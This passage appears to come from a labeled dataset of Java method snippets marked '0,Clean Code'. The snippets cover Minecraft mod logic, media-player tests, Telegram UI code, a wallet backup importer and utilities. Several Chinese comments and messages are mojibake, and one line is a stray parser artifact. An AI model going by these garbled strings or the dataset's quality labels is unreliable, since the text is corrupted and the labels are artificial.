  Level world=crafter.getLevel();
  List<MechanicalCrafterBlockEntity> crafters=new ArrayList<>();
  BlockState blockState=crafter.getBlockState();
  if (!isCrafter(blockState))   return crafters;
  Direction blockFacing=blockState.getValue(HORIZONTAL_FACING);
  Direction blockPointing=MechanicalCrafterBlock.getTargetDirection(blockState);
  for (  Direction facing : Iterate.directions) {
    if (blockFacing.getAxis() == facing.getAxis())     continue;
    if (blockPointing == facing)     continue;
    BlockPos neighbourPos=pos.relative(facing);
    BlockState neighbourState=world.getBlockState(neighbourPos);
    if (!isCrafter(neighbourState))     continue;
    if (MechanicalCrafterBlock.getTargetDirection(neighbourState) != facing.getOpposite())     continue;
    if (blockFacing != neighbourState.getValue(HORIZONTAL_FACING))     continue;
    MechanicalCrafterBlockEntity be=CrafterHelper.getCrafter(world,neighbourPos);
    if (be == null)     continue;
    crafters.add(be);
  }
  return crafters;
}
",0,Clean Code
"@Test public void testRead() throws IOException {
  DataSourceInputStream inputStream=buildTestInputStream();
  byte[] readBytes=new byte[TEST_DATA.length];
  int totalBytesRead=0;
  while (totalBytesRead < TEST_DATA.length) {
    int bytesRead=inputStream.read(readBytes,totalBytesRead,TEST_DATA.length - totalBytesRead);
    assertThat(bytesRead).isGreaterThan(0);
    totalBytesRead+=bytesRead;
    assertThat(inputStream.bytesRead()).isEqualTo(totalBytesRead);
  }
  assertThat(readBytes).isEqualTo(TEST_DATA);
  assertThat(inputStream.bytesRead()).isEqualTo(TEST_DATA.length);
  assertThat(totalBytesRead).isEqualTo(TEST_DATA.length);
  assertThat(inputStream.read()).isEqualTo(-1);
  inputStream.close();
}",0,Clean Code
"@Override public void onScrollStateChanged(RecyclerView recyclerView,int newState){
  if (newState == RecyclerView.SCROLL_STATE_DRAGGING) {
    wasManualScroll=true;
    scrollingManually=true;
  }
 else {
    scrollingManually=false;
  }
  if (newState == RecyclerView.SCROLL_STATE_IDLE) {
    wasManualScroll=false;
    disableActionBarScrolling=false;
    if (waitingForScrollFinished) {
      waitingForScrollFinished=false;
      if (updatePullAfterScroll) {
        viewPage.listView.updatePullState();
        updatePullAfterScroll=false;
      }
      viewPage.dialogsAdapter.notifyDataSetChanged();
    }
    if (filterTabsView != null && filterTabsView.getVisibility() == View.VISIBLE && viewPages[0].listView == recyclerView) {
      int scrollY=(int)-actionBar.getTranslationY();
      int actionBarHeight=ActionBar.getCurrentActionBarHeight();
      if (scrollY != 0 && scrollY != actionBarHeight) {
        if (scrollY < actionBarHeight / 2) {
          if (viewPages[0].listView.canScrollVertically(-1)) {
            recyclerView.smoothScrollBy(0,-scrollY);
          }
        }
 else         if (viewPages[0].listView.canScrollVertically(1)) {
          recyclerView.smoothScrollBy(0,actionBarHeight - scrollY);
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * Creates a new factory for  {@link SsMediaSource}s.
 * @param dataSourceFactory A factory for {@link DataSource} instances that will be used to loadmanifest and media data.
 */
public Factory(DataSource.Factory dataSourceFactory){
  this(new DefaultSsChunkSource.Factory(dataSourceFactory),dataSourceFactory);
}
/** 
 * Creates a new factory for  {@link SsMediaSource}s.
 * @param chunkSourceFactory A factory for {@link SsChunkSource} instances.
 * @param manifestDataSourceFactory A factory for {@link DataSource} instances that will be usedto load (and refresh) the manifest. May be  {@code null} if the factory will only ever beused to create create media sources with sideloaded manifests via  {@link #createMediaSource(SsManifest,Handler,MediaSourceEventListener)}.
 */
public Factory(SsChunkSource.Factory chunkSourceFactory,@Nullable DataSource.Factory manifestDataSourceFactory){
  this.chunkSourceFactory=Assertions.checkNotNull(chunkSourceFactory);
  this.manifestDataSourceFactory=manifestDataSourceFactory;
  loadErrorHandlingPolicy=new DefaultLoadErrorHandlingPolicy();
  livePresentationDelayMs=DEFAULT_LIVE_PRESENTATION_DELAY_MS;
  compositeSequenceableLoaderFactory=new DefaultCompositeSequenceableLoaderFactory();
}
",0,Clean Code
"@Override public Keystore getKeystore(ScriptType scriptType,InputStream inputStream,String password) throws ImportException {
  try {
    String input=CharStreams.toString(new InputStreamReader(inputStream,StandardCharsets.UTF_8));
    Gson gson=new Gson();
    Type stringStringMap=new TypeToken<Map<String,JsonElement>>(){
    }
.getType();
    Map<String,JsonElement> map=gson.fromJson(input,stringStringMap);
    String payload=input;
    if (map.containsKey(""payload"")) {
      payload=map.get(""payload"").getAsString();
    }
    int version=1;
    if (map.containsKey(""version"")) {
      version=map.get(""version"").getAsInt();
    }
    String decrypted;
    if (version == 1) {
      decrypted=SamouraiUtil.decrypt(payload,password,SamouraiUtil.DefaultPBKDF2Iterations);
    }
 else     if (version == 2) {
      decrypted=SamouraiUtil.decryptSHA256(payload,password);
    }
 else {
      throw new ImportException(""Unsupported backup version: "" + version);
    }
    SamouraiBackup backup=gson.fromJson(decrypted,SamouraiBackup.class);
    DeterministicSeed seed=new DeterministicSeed(Utils.hexToBytes(backup.wallet.seed),password,0);
    Keystore keystore=Keystore.fromSeed(seed,scriptType.getDefaultDerivation());
    keystore.setLabel(getWalletModel().toDisplayString());
    return keystore;
  }
 catch (  JsonParseException e) {
    throw new ImportException(""Failed to decrypt the wallet backup file, check if the password is correct."");
  }
catch (  ImportException e) {
    throw e;
  }
catch (  Exception e) {
    throw new ImportException(""Error importing backup"",e);
  }
}",0,Clean Code
"/** 
 * Returns the allocated bitrate. 
 */
long getAllocatedBandwidth();
@Override public long getAllocatedBandwidth(){
  long totalBandwidth=(long)(bandwidthMeter.getBitrateEstimate() * bandwidthFraction);
  long allocatableBandwidth=Math.max(0L,totalBandwidth - nonAllocatableBandwidth);
  if (allocationCheckpoints == null) {
    return allocatableBandwidth;
  }
  int nextIndex=1;
  while (nextIndex < allocationCheckpoints.length - 1 && allocationCheckpoints[nextIndex][0] < allocatableBandwidth) {
    nextIndex++;
  }
  long[] previous=allocationCheckpoints[nextIndex - 1];
  long[] next=allocationCheckpoints[nextIndex];
  float fractionBetweenCheckpoints=(float)(allocatableBandwidth - previous[0]) / (next[0] - previous[0]);
  return previous[1] + (long)(fractionBetweenCheckpoints * (next[1] - previous[1]));
}",0,Clean Code
"/** 
 * 璁剧疆鍔犺浇鐨勬椿璺冪殑profile鏂囦欢
 */
public static void setLoadActiveProfiles(String[] activeProfiles){
  if (activeProfiles == null || activeProfiles.length == 0) {
    return;
  }
  for (  String profile : activeProfiles) {
    if (profile.contains(""dev"") || profile.contains(""integration"")) {
      type=EnvType.DEV;
    }
 else     if (profile.contains(""test"")) {
      type=EnvType.TEST;
    }
 else     if (profile.contains(""stable"")) {
      type=EnvType.STABLE;
    }
 else     if (profile.contains(""pressure"")) {
      type=EnvType.PRESSURE;
    }
 else     if (profile.contains(""pre"")) {
      type=EnvType.PRECN;
    }
 else     if (profile.contains(""online"")) {
      type=EnvType.ONLINECN;
    }
  }
}",0,Clean Code
"@Test public void testMultipleChaining() throws IOException, SubtitleDecoderException {
  TtmlSubtitle subtitle=getSubtitle(CHAIN_MULTIPLE_STYLES_TTML_FILE);
  assertThat(subtitle.getEventTimeCount()).isEqualTo(2);
  Map<String,TtmlStyle> globalStyles=subtitle.getGlobalStyles();
  TtmlStyle style=globalStyles.get(""s2"");
  assertThat(style.getFontFamily()).isEqualTo(""serif"");
  assertThat(style.getBackgroundColor()).isEqualTo(0xFFFF0000);
  assertThat(style.getFontColor()).isEqualTo(0xFF000000);
  assertThat(style.getStyle()).isEqualTo(TtmlStyle.STYLE_BOLD_ITALIC);
  assertThat(style.isLinethrough()).isTrue();
  style=globalStyles.get(""s3"");
  assertThat(style.getFontColor()).isEqualTo(0xFFFF0000);
  assertThat(style.getFontFamily()).isEqualTo(""serif"");
  assertThat(style.getBackgroundColor()).isEqualTo(0xFFFF0000);
  assertThat(style.getStyle()).isEqualTo(TtmlStyle.STYLE_BOLD_ITALIC);
  assertThat(style.isLinethrough()).isTrue();
}",0,Clean Code
"/** 
 * Computes the selectivity of a semijoin filter if it is applied on a fact table. The computation is based on the selectivity of the dimension table/columns and the number of distinct values in the fact table columns.
 * @param factRel fact table participating in the semijoin
 * @param dimRel  dimension table participating in the semijoin
 * @param rel     semijoin rel
 * @return calculated selectivity
 */
public static double computeSemiJoinSelectivity(RelMetadataQuery mq,RelNode factRel,RelNode dimRel,Join rel){
  return computeSemiJoinSelectivity(mq,factRel,dimRel,rel.analyzeCondition().leftKeys,rel.analyzeCondition().rightKeys);
}
/** 
 * Computes the selectivity of a semijoin filter if it is applied on a fact table. The computation is based on the selectivity of the dimension table/columns and the number of distinct values in the fact table columns.
 * @param factRel     fact table participating in the semijoin
 * @param dimRel      dimension table participating in the semijoin
 * @param factKeyList LHS keys used in the filter
 * @param dimKeyList  RHS keys used in the filter
 * @return calculated selectivity
 */
public static double computeSemiJoinSelectivity(RelMetadataQuery mq,RelNode factRel,RelNode dimRel,List<Integer> factKeyList,List<Integer> dimKeyList){
  ImmutableBitSet.Builder factKeys=ImmutableBitSet.builder();
  for (  int factCol : factKeyList) {
    factKeys.set(factCol);
  }
  ImmutableBitSet.Builder dimKeyBuilder=ImmutableBitSet.builder();
  for (  int dimCol : dimKeyList) {
    dimKeyBuilder.set(dimCol);
  }
  final ImmutableBitSet dimKeys=dimKeyBuilder.build();
  Double factPop=mq.getPopulationSize(factRel,factKeys.build());
  if (factPop == null) {
    factPop=mq.getPopulationSize(dimRel,dimKeys);
  }
  Double selectivity;
  Double dimCard=mq.getDistinctRowCount(dimRel,dimKeys,null);
  if ((dimCard != null) && (factPop != null)) {
    if (factPop < 1.0) {
      factPop=1.0;
    }
    selectivity=dimCard / factPop;
  }
 else {
    selectivity=mq.getPercentageOriginalRows(dimRel);
  }
  if (selectivity == null) {
    selectivity=Math.pow(0.1,dimKeys.cardinality());
  }
 else   if (selectivity > 1.0) {
    selectivity=1.0;
  }
  return selectivity;
}",0,Clean Code
"@Override public List<PmsProduct> search(String keyword,Long brandId,Long productCategoryId,Integer pageNum,Integer pageSize,Integer sort){
  PageHelper.startPage(pageNum,pageSize);
  PmsProductExample example=new PmsProductExample();
  PmsProductExample.Criteria criteria=example.createCriteria();
  criteria.andDeleteStatusEqualTo(0);
  if (StrUtil.isNotEmpty(keyword)) {
    criteria.andNameLike(""%"" + keyword + ""%"");
  }
  if (brandId != null) {
    criteria.andBrandIdEqualTo(brandId);
  }
  if (productCategoryId != null) {
    criteria.andProductCategoryIdEqualTo(productCategoryId);
  }
  if (sort == 1) {
    example.setOrderByClause(""id desc"");
  }
 else   if (sort == 2) {
    example.setOrderByClause(""sale desc"");
  }
 else   if (sort == 3) {
    example.setOrderByClause(""price asc"");
  }
 else   if (sort == 4) {
    example.setOrderByClause(""price desc"");
  }
  return productMapper.selectByExample(example);
}",0,Clean Code
"/** 
 * 閫氳繃batchId鍒犻櫎
 * @param batchId batchId
 * @return data
 */
@Override public void deleteByBatchId(List<String> batchId){
  if (batchId.size() == 0) {
    return;
  }
  List<AdminFile> fileList=lambdaQuery().select(AdminFile::getFileId).in(AdminFile::getBatchId,batchId).list();
  List<Long> fileIdList=fileList.stream().map(AdminFile::getFileId).collect(Collectors.toList());
  fileIdList.forEach(this::deleteById);
}
@Override public void deleteByBatchId(AdminDeleteByBatchIdBO deleteByBatchIdBO){
  Integer type=deleteByBatchIdBO.getType();
  String fileType="""";
  if (Objects.equals(1,type)) {
    fileType=""file"";
  }
 else   if (Objects.equals(2,type)) {
    fileType=""img"";
  }
  List<AdminFile> fileList=lambdaQuery().select(AdminFile::getFileId).eq(AdminFile::getBatchId,deleteByBatchIdBO.getBatchId()).eq(StrUtil.isNotEmpty(fileType),AdminFile::getFileType,fileType).list();
  List<Long> fileIdList=fileList.stream().map(AdminFile::getFileId).collect(Collectors.toList());
  fileIdList.forEach(this::deleteById);
}",0,Clean Code
"public TreeSelect(){
}
public TreeSelect(Long id,String label){
  this.id=id;
  this.label=label;
}
public TreeSelect(Long id,String label,List<SysResourceEntity> resources){
  this.id=id;
  this.label=label;
  this.children=resources.stream().map(TreeSelect::new).collect(Collectors.toList());
}
public TreeSelect(SysMenuEntity menu){
  this.id=menu.getMenuId();
  this.label=menu.getMenuName();
  this.children=menu.getChildren().stream().map(TreeSelect::new).collect(Collectors.toList());
}
public TreeSelect(SysResourceEntity resource){
  this.id=resource.getResourceId();
  this.label=resource.getResourceName();
}
",0,Clean Code
"/** 
 * Converts this  {@link GenericArrayData} into an array of Java {@link Object}. <p>The method will convert a primitive array into an object array. But it will not convert internal data structures into external data structures (e.g.  {@link StringData} to {@link String}).
 */
public Object[] toObjectArray(){
  if (isPrimitiveArray) {
    Class<?> arrayClass=array.getClass();
    if (int[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((int[])array);
    }
 else     if (long[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((long[])array);
    }
 else     if (float[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((float[])array);
    }
 else     if (double[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((double[])array);
    }
 else     if (short[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((short[])array);
    }
 else     if (byte[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((byte[])array);
    }
 else     if (boolean[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((boolean[])array);
    }
    throw new RuntimeException(""Unsupported primitive array: "" + arrayClass);
  }
 else {
    return (Object[])array;
  }
}
",0,Clean Code
"public static void setEpicenterCallback(Object transition,final TransitionEpicenterCallback callback){
  if (Build.VERSION.SDK_INT >= 21) {
    if (callback == null) {
      ((Transition)transition).setEpicenterCallback(null);
    }
 else {
      ((Transition)transition).setEpicenterCallback(new Transition.EpicenterCallback(){
        @Override public Rect onGetEpicenter(        Transition transition11){
          return callback.onGetEpicenter(transition11);
        }
      }
);
    }
  }
}",0,Clean Code
"/** 
 * Read an object from an AMF encoded buffer.
 * @param data The buffer from which to read.
 * @return The value read from the buffer.
 */
private static HashMap<String,Object> readAmfObject(ParsableByteArray data){
  HashMap<String,Object> array=new HashMap<>();
  while (true) {
    String key=readAmfString(data);
    int type=readAmfType(data);
    if (type == AMF_TYPE_END_MARKER) {
      break;
    }
    Object value=readAmfData(data,type);
    if (value != null) {
      array.put(key,value);
    }
  }
  return array;
}
",0,Clean Code
"public static void copyFolder(String sourcePath,String targetPath) throws Exception {
  File sourceFile=new File(sourcePath);
  File targetFile=new File(targetPath);
  if (!sourceFile.exists()) {
    throw new Exception(""鏂囦欢澶逛笉瀛樺湪"");
  }
  if (!sourceFile.isDirectory()) {
    throw new Exception(""婧愭枃浠跺す涓嶆槸鐩綍"");
  }
  if (!targetFile.exists()) {
    targetFile.mkdirs();
  }
  if (!targetFile.isDirectory()) {
    throw new Exception(""鐩爣鏂囦欢澶逛笉鏄洰褰�"");
  }
  File[] files=sourceFile.listFiles();
  if (files == null || files.length == 0) {
    return;
  }
  for (  File file : files) {
    String movePath=targetFile + File.separator + file.getName();
    if (file.isDirectory()) {
      copyFolder(file.getAbsolutePath(),movePath);
    }
 else {
      BufferedInputStream in=new BufferedInputStream(new FileInputStream(file));
      BufferedOutputStream out=new BufferedOutputStream(new FileOutputStream(movePath));
      byte[] b=new byte[1024];
      int temp=0;
      while ((temp=in.read(b)) != -1) {
        out.write(b,0,temp);
      }
      out.close();
      in.close();
    }
  }
}",0,Clean Code
"private CharSequence getMessageCaption(MessageObject messageObject,MessageObject.GroupedMessages group){
  return getMessageCaption(messageObject,group,null);
}
private CharSequence getMessageCaption(MessageObject messageObject,MessageObject.GroupedMessages group,int[] msgId){
  String restrictionReason=MessagesController.getRestrictionReason(messageObject.messageOwner.restriction_reason);
  if (!TextUtils.isEmpty(restrictionReason)) {
    return restrictionReason;
  }
  if (messageObject.isVoiceTranscriptionOpen() && !TranscribeButton.isTranscribing(messageObject)) {
    return messageObject.getVoiceTranscription();
  }
  if (messageObject.caption != null) {
    return messageObject.caption;
  }
  if (group == null) {
    return null;
  }
  CharSequence caption=null;
  for (int a=0, N=group.messages.size(); a < N; a++) {
    MessageObject message=group.messages.get(a);
    if (message.caption != null) {
      if (caption != null) {
        return null;
      }
      caption=message.caption;
      if (msgId != null) {
        msgId[0]=message.getId();
      }
    }
  }
  return caption;
}",0,Clean Code
"private void handleAppMessage(ChannelInfo channelInfo,WebSocketFrame messageFrame,JSONObject message,String messageRaw){
  EventContext context=new EventContext();
  try {
    WebSocketFrame newMessageFrame=null;
    String type=null;
    if (message.has(""type"") && !message.isNull(""type"")) {
      type=message.getString(""type"");
    }
    if (MESSAGE_EVENT_TYPE.equalsIgnoreCase(type)) {
      String eventName=null;
      if (message.has(""name"") && !message.isNull(""name"")) {
        eventName=(String)message.get(""name"");
      }
      if (eventName == null) {
        LOGGER.error(""No event name could be found in client message: {}"",messageRaw);
        return;
      }
      EventHandler eventHandler=eventHandlerMap.get(eventName);
      if (eventHandler != null) {
        newMessageFrame=handleWithEventHandler(eventHandler,channelInfo,messageRaw,context);
      }
    }
 else     if (MESSAGE_REQUEST_TYPE.equalsIgnoreCase(type)) {
      String requestName=null;
      if (message.has(""name"") && !message.isNull(""name"")) {
        requestName=(String)message.get(""name"");
      }
      if (requestName == null) {
        LOGGER.error(""No request name could be found in app request message: {}"",messageRaw);
        return;
      }
      handleWithAppRequestHandler(channelInfo,message,messageRaw,requestName);
    }
    handleAppMessage(channelInfo,messageFrame,message,newMessageFrame,context);
  }
 catch (  Exception exception) {
    LOGGER.error(""Error occurred while handling app message: {}"",messageRaw,exception);
    handleError(channelInfo,message,exception);
  }
}
private void handleAppMessage(ChannelInfo channelInfo,WebSocketFrame messageFrame,JSONObject message,WebSocketFrame newMessageFrame,EventContext context){
  if (message.has(MESSAGE_CLIENT_KEY) && !message.isNull(MESSAGE_CLIENT_KEY)) {
    String email=message.getString(MESSAGE_CLIENT_KEY);
    if (newMessageFrame != null) {
      communicator.sendMessageToClient(channelInfo,email,newMessageFrame,context);
    }
 else {
      communicator.sendMessageToClient(channelInfo,email,messageFrame.copy(),context);
    }
  }
 else   if (context.isBroadcast()) {
    if (newMessageFrame != null) {
      communicator.broadcastMessageToClients(channelInfo,newMessageFrame,context);
    }
 else {
      communicator.broadcastMessageToClients(channelInfo,messageFrame.copy(),context);
    }
  }
}
",0,Clean Code
"/** 
 * Creates a callback which always returns a specific value.
 * @param result The value that should be returned to callers of the hooked method.
 */
public static XC_MethodReplacement returnConstant(final Object result){
  return returnConstant(PRIORITY_DEFAULT,result);
}
/** 
 * Like  {@link #returnConstant(Object)}, but allows to specify a priority for the callback.
 * @param priority See {@link XCallback#priority}.
 * @param result   The value that should be returned to callers of the hooked method.
 */
public static XC_MethodReplacement returnConstant(int priority,final Object result){
  return new XC_MethodReplacement(priority){
    @Override protected Object replaceHookedMethod(    MethodHookParam param) throws Throwable {
      return result;
    }
  }
;
}
",0,Clean Code
"private static ItemRequirement defaultOf(BlockState state,BlockEntity be){
  Block block=state.getBlock();
  if (block == Blocks.AIR)   return NONE;
  Item item=block.asItem();
  if (item == Items.AIR)   return INVALID;
  if (state.hasProperty(BlockStateProperties.SLAB_TYPE) && state.getValue(BlockStateProperties.SLAB_TYPE) == SlabType.DOUBLE)   return new ItemRequirement(ItemUseType.CONSUME,new ItemStack(item,2));
  if (block instanceof TurtleEggBlock)   return new ItemRequirement(ItemUseType.CONSUME,new ItemStack(item,state.getValue(TurtleEggBlock.EGGS).intValue()));
  if (block instanceof SeaPickleBlock)   return new ItemRequirement(ItemUseType.CONSUME,new ItemStack(item,state.getValue(SeaPickleBlock.PICKLES).intValue()));
  if (block instanceof SnowLayerBlock)   return new ItemRequirement(ItemUseType.CONSUME,new ItemStack(item,state.getValue(SnowLayerBlock.LAYERS).intValue()));
  if (block == ForgeRegistries.BLOCKS.getValue(Mods.FD.asResource(""rich_soil_farmland"")))   return new ItemRequirement(ItemUseType.CONSUME,ForgeRegistries.ITEMS.getValue(Mods.FD.asResource(""rich_soil"")));
  if (block instanceof FarmBlock || block instanceof DirtPathBlock)   return new ItemRequirement(ItemUseType.CONSUME,Items.DIRT);
  if (block instanceof AbstractBannerBlock && be instanceof BannerBlockEntity)   return new ItemRequirement(new StrictNbtStackRequirement(bannerBE.getItem(),ItemUseType.CONSUME));
  if (block == Blocks.TALL_GRASS)   return new ItemRequirement(ItemUseType.CONSUME,new ItemStack(Items.GRASS,2));
  if (block == Blocks.LARGE_FERN)   return new ItemRequirement(ItemUseType.CONSUME,new ItemStack(Items.FERN,2));
  return new ItemRequirement(ItemUseType.CONSUME,item);
}",0,Clean Code
"private void applyTag(IN input,StringBuilder sb,Field<IN,?> field,String tag){
  if (field == null) {
    applyValue(sb,tag,null);
    return;
  }
  Object xmlNodeValue=field.transform(input);
  if (xmlNodeValue instanceof Collection<?>) {
    if (children.isEmpty()) {
      applyValue(sb,tag,null);
    }
 else {
      sb.append("">"");
      tagIndex++;
      for (      Object xmlNodeElem : children) {
        apply(input,sb,(Field<IN,?>)xmlNodeElem);
      }
      tagIndex--;
      if (pretty) {
        sb.append(System.lineSeparator()).append(offset(tagIndex));
      }
      sb.append(""</"").append(tag).append("">"");
    }
  }
 else   if (xmlNodeValue instanceof String) {
    applyValue(sb,tag,(String)xmlNodeValue);
  }
 else   if (xmlNodeValue == null) {
    applyValue(sb,tag,null);
  }
}
",0,Clean Code
"public COSManager(IaasProperties prop){
  super(prop);
  if (prop == null) {
    String msg=""鍒濆鍖� [COS] 閿欒, 璇锋鏌ラ厤缃枃浠� [iaas] 鏄惁閰嶇疆"";
    log.error(msg);
    throw new NullPointerException(msg);
  }
  if (!IaasEnum.TENCENT.getType().equals(prop.getOsType())) {
    String msg=String.format(""鍒濆鍖� [COS] 閿欒, 璇锋鏌ラ厤缃枃浠� [iaas.osType] 閰嶇疆椤规槸鍚︿负 \""tencent\"", 褰撳墠涓� \""%s\"""",prop.getOsType());
    log.error(msg);
    throw new IllegalArgumentException(msg);
  }
  if (prop.getCos() == null) {
    String msg=""鍒濆鍖� [COS] 閿欒, 鏈厤缃� [COS] 鍙傛暟, 璇锋鏌ラ厤缃枃浠� [iaas.cos] 閰嶇疆椤�"";
    log.error(msg);
    throw new IllegalArgumentException(msg);
  }
 else {
    regionName=prop.getCos().getRegionName();
    accessKey=prop.getCos().getAccessKey();
    secretKey=prop.getCos().getSecretKey();
    bucketName=prop.getCos().getBucketName();
    domain=prop.getCos().getDomain();
    defaultPath=prop.getCos().getDefaultPath();
  }
  COSCredentials cred=new BasicCOSCredentials(accessKey,secretKey);
  ClientConfig clientConfig=new ClientConfig(new Region(regionName));
  client=new COSClient(cred,clientConfig);
}
",0,Clean Code
"@Override public void onBindViewHolder(@NonNull RecyclerViewHolder holder,int position){
  NewInfo model=getItem(position);
  if (model != null) {
    holder.text(R.id.tv_user_name,model.getUserName());
    holder.text(R.id.tv_tag,model.getTag());
    holder.text(R.id.tv_title,model.getTitle());
    holder.text(R.id.tv_summary,model.getSummary());
    holder.text(R.id.tv_praise,model.getPraise() == 0 ? ""点赞"" : String.valueOf(model.getPraise()));
    holder.text(R.id.tv_comment,model.getComment() == 0 ? ""评论"" : String.valueOf(model.getComment()));
    holder.text(R.id.tv_read,""阅读量 "" + model.getRead());
    holder.image(R.id.iv_image,model.getImageUrl());
  }
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5c2f685f",0,Clean Code
"/** 
 * 鍒ゆ柇鏄惁璺宠繃鎴块棿閰嶇疆椤�
 * @param cellConfigPermissionBO 閰嶇疆椤规潈闄�
 * @param roomConfigParamRequest 鎴块棿閰嶇疆椤瑰弬鏁拌姹�
 * @param isEditRoom             鏄惁鏄紪杈戞埧闂�
 * @return 鏄惁璺宠繃
 */
private static boolean isSkipRoomConfig(CellConfigPermissionBO cellConfigPermissionBO,RoomConfigParamRequest roomConfigParamRequest,boolean isEditRoom){
  if (!cellConfigPermissionBO.getIsUserModifiable()) {
    return true;
  }
  if (!cellConfigPermissionBO.getIsUserVisible()) {
    return true;
  }
  if (isEditRoom && !cellConfigPermissionBO.getIsUserLiveModifiable()) {
    return true;
  }
  if (Objects.isNull(roomConfigParamRequest) || roomConfigParamRequest.getIsUseDefaultValue()) {
    if (cellConfigPermissionBO.getIsRequired()) {
      if (!cellConfigPermissionBO.getIsHaveDefaultValue()) {
        throw new ServiceException(""鏃犻粯璁ゅ�硷紝缂哄皯蹇呭～椤癸細"" + cellConfigPermissionBO.getName());
      }
      if (!cellConfigPermissionBO.getIsUserCanUseDefaultValue()) {
        throw new ServiceException(""鐢ㄦ埛闇�濉啓蹇呭～椤癸細"" + cellConfigPermissionBO.getName());
      }
    }
    return true;
  }
  return false;
}
",0,Clean Code
"Glide createGlide(){
  if (sourceService == null) {
    final int cores=Math.max(1,Runtime.getRuntime().availableProcessors());
    sourceService=new FifoPriorityThreadPoolExecutor(cores);
  }
  if (diskCacheService == null) {
    diskCacheService=new FifoPriorityThreadPoolExecutor(1);
  }
  MemorySizeCalculator calculator=new MemorySizeCalculator(context);
  if (bitmapPool == null) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
      int size=calculator.getBitmapPoolSize();
      bitmapPool=new LruBitmapPool(size);
    }
 else {
      bitmapPool=new BitmapPoolAdapter();
    }
  }
  if (memoryCache == null) {
    memoryCache=new LruResourceCache(calculator.getMemoryCacheSize());
  }
  if (diskCacheFactory == null) {
    if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
      diskCacheFactory=new ExternalCacheDiskCacheFactory(context);
    }
 else {
      diskCacheFactory=new InternalCacheDiskCacheFactory(context);
    }
  }
  if (engine == null) {
    engine=new Engine(memoryCache,diskCacheFactory,diskCacheService,sourceService);
  }
  if (decodeFormat == null) {
    decodeFormat=DecodeFormat.DEFAULT;
  }
  return new Glide(engine,memoryCache,bitmapPool,context,decodeFormat,diskCacheFactory);
}",0,Clean Code
"/** 
 * Tests the that SubMesh (mesh with the video) contains expected data. 
 */
private static void testSubMesh(Projection.Mesh leftMesh){
  assertThat(leftMesh.getSubMeshCount()).isEqualTo(1);
  Projection.SubMesh subMesh=leftMesh.getSubMesh(0);
  assertThat(subMesh.mode).isEqualTo(Projection.DRAW_MODE_TRIANGLES);
  float[] vertices=subMesh.vertices;
  float[] uv=subMesh.textureCoords;
  assertThat(vertices.length).isEqualTo(VERTEX_COUNT * 3);
  assertThat(subMesh.textureCoords.length).isEqualTo(VERTEX_COUNT * 2);
  testCoordinate(FIRST_VERTEX,vertices,0,3);
  testCoordinate(LAST_VERTEX,vertices,VERTEX_COUNT * 3 - 3,3);
  testCoordinate(FIRST_UV,uv,0,2);
  testCoordinate(LAST_UV,uv,VERTEX_COUNT * 2 - 2,2);
}",0,Clean Code
"public Set<String> getImportClasses(){
  Set<String> importClasses=new LinkedHashSet<>();
  addImportClass(importClasses,propertyType);
  if (isPrimaryKey || (columnConfig != null && columnConfig.isPrimaryKey())) {
    addImportClass(importClasses,Id.class.getName());
    if (isAutoIncrement || (columnConfig != null && columnConfig.getKeyType() != null)) {
      addImportClass(importClasses,KeyType.class.getName());
    }
  }
  if (columnConfig != null) {
    if (columnConfig.getPropertyType() != null) {
      addImportClass(importClasses,columnConfig.getPropertyType());
    }
    if (columnConfig.getMaskType() != null) {
      addImportClass(importClasses,ColumnMask.class.getName());
      if (MaskManager.getProcessorMap().containsKey(columnConfig.getMaskType())) {
        addImportClass(importClasses,Masks.class.getName());
      }
    }
    if (columnConfig.getJdbcType() != null) {
      addImportClass(importClasses,""org.apache.ibatis.type.JdbcType"");
    }
    if (columnConfig.getTypeHandler() != null) {
      addImportClass(importClasses,columnConfig.getTypeHandler().getName());
    }
    boolean needGenColumnAnnotation=(entityConfig != null && entityConfig.isAlwaysGenColumnAnnotation()) || !name.equalsIgnoreCase(StringUtil.camelToUnderline(property)) || (entityConfig != null && entityConfig.isColumnCommentEnable() && StringUtil.isNotBlank(this.comment));
    if (columnConfig.getOnInsertValue() != null || columnConfig.getOnUpdateValue() != null || columnConfig.getLarge() != null || columnConfig.getLogicDelete() != null || columnConfig.getVersion() != null || columnConfig.getJdbcType() != null || columnConfig.getTypeHandler() != null || Boolean.TRUE.equals(columnConfig.getTenantId()) || needGenColumnAnnotation) {
      addImportClass(importClasses,com.mybatisflex.annotation.Column.class.getName());
    }
  }
  return importClasses;
}
",0,Clean Code
"public static void addToPulledDialogs(BaseFragment thisFragment,int stackIndex,TLRPC.Chat chat,TLRPC.User user,long dialogId,int folderId,int filterId){
  if (chat == null && user == null) {
    return;
  }
  if (thisFragment == null) {
    return;
  }
  INavigationLayout parentLayout=thisFragment.getParentLayout();
  if (parentLayout == null) {
    return;
  }
  if (parentLayout.getPulledDialogs() == null) {
    parentLayout.setPulledDialogs(new ArrayList<>());
  }
  boolean alreadyAdded=false;
  for (  PulledDialog d : parentLayout.getPulledDialogs()) {
    if (d.dialogId == dialogId) {
      alreadyAdded=true;
      break;
    }
  }
  if (!alreadyAdded) {
    PulledDialog d=new PulledDialog();
    d.activity=ChatActivity.class;
    d.stackIndex=stackIndex;
    d.dialogId=dialogId;
    d.filterId=filterId;
    d.folderId=folderId;
    d.chat=chat;
    d.user=user;
    parentLayout.getPulledDialogs().add(d);
  }
}
",0,Clean Code
"/** 
 * Creates default RowHeaderPresenter using a title view and a description view.
 * @see ViewHolder#ViewHolder(View)
 */
public RowHeaderPresenter(){
  this(R.layout.lb_row_header);
}
/** 
 * @hide
 */
@RestrictTo(LIBRARY_GROUP) public RowHeaderPresenter(int layoutResourceId){
  this(layoutResourceId,true);
}
/** 
 * @hide
 */
@RestrictTo(LIBRARY_GROUP) public RowHeaderPresenter(int layoutResourceId,boolean animateSelect){
  mLayoutResourceId=layoutResourceId;
  mAnimateSelect=animateSelect;
}
",0,Clean Code
"private void onUpEvent(final int x,final int y,final long eventTime){
  if (DEBUG_EVENT) {
